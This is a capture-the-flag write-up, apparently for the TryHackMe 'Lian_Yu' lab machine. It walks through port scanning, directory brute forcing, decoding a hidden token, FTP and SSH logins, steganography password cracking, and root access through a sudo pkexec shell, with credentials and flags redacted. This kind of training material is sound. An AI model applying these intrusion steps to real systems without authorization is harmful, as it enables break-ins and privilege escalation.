## Target IP: 10.10.235.235

---

### Environment Variables

```bash
export IP=10.10.235.235
export LIP=10.6.24.56
```

---

### Nmap Scan

```bash
sudo nmap -sC -sV -T4 -O $IP -oN nmap_scan.txt
```

**Open Ports:**

| Port | Service | Version |
| --- | --- | --- |
| 21 | FTP | vsftpd 3.0.2 |
| 22 | SSH | OpenSSH 6.7p1 |
| 80 | HTTP | Apache httpd |
| 111 | rpcbind | v2-4 |

---

### Web Enumeration

Visited: `http://$IP`

→ Arrowverse-themed page

→ Source code: nothing useful

---

### Directory Brute Force

```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Found:**

- `/island`

Visited `/island` → Page says:

```
Ohhh Noo, Don't Talk...............
I wasn't Expecting You at this Moment. I will meet you there
You should find a way to Lian_Yu as we are planed. The Code Word is:
```

Source code shows:

```
The Code Word is: <h2 style="color:white">vigilante</h2>
```

---

### Brute Force `/island`

```bash
gobuster dir -u http://$IP/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Found:** `/island/2100`

→ Displays YouTube clip

→ Source code:

```html
<!-- you can avail your .ticket here but how? -->
```

---

### Brute Force `.ticket` File

```bash
gobuster -t 100 dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$IP/island/2100 -x .ticket
```

Found `.ticket` file → Displays:

```
This is just a token to get into Queen's Gambit(Ship)
RTy8yhBQdscX
```

Decoded `RTy8yhBQdscX` in **CyberChef** (Base58) → Result:

```
[REDACTED]
```

---

### FTP Login

```bash
ftp $IP
# Username: vigilante
# Password: [REDACTED]
```

Logged in successfully.

```bash
ls -lsa
```

**Files:**

- Leave_me_alone.png
- Queen's_Gambit.png
- .other_user
- .bashrc

Downloaded all files.

---

### Exploring Downloaded Files

- `.other_user` → Text about **Slade Wilson**
- `.jpg` files → suspicious

---

### Steghide on Queen's_Gambit.png

```bash
steghide extract -sf Queen's_Gambit.png
# Asks for passphrase
```

Cracked with:

```bash
stegcracker Queen's_Gambit.png
# → password = [REDACTED]
```

Extracted file: `aa.jpg.out` (Zip file)

```bash
unzip aa.jpg.out
```

Extracted:

- `passwd.txt`
- `shado`

---

### Exploring `passwd.txt` and `shado`

- `passwd.txt` → Narrative about Lian_Yu
- `shado` → Contains password:

```
[REDACTED]
```

---

### SSH as Slade

```bash
ssh slade@$IP
# Password: [REDACTED]
```

Login successful.

---

### User Flag

```bash
cat user.txt
# → THM{[REDACTED]}
```

---

### Privilege Escalation

```bash
sudo -l
# → Can run pkexec as root
```

Used GTFOBins:

```bash
sudo pkexec /bin/sh
```

Got root shell.

---

### Root Flag

```bash
cat /root/root.txt
```

```
Mission accomplished

You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE.

THM{[REDACTED]}
                                                                    --DEATHSTROKE
```
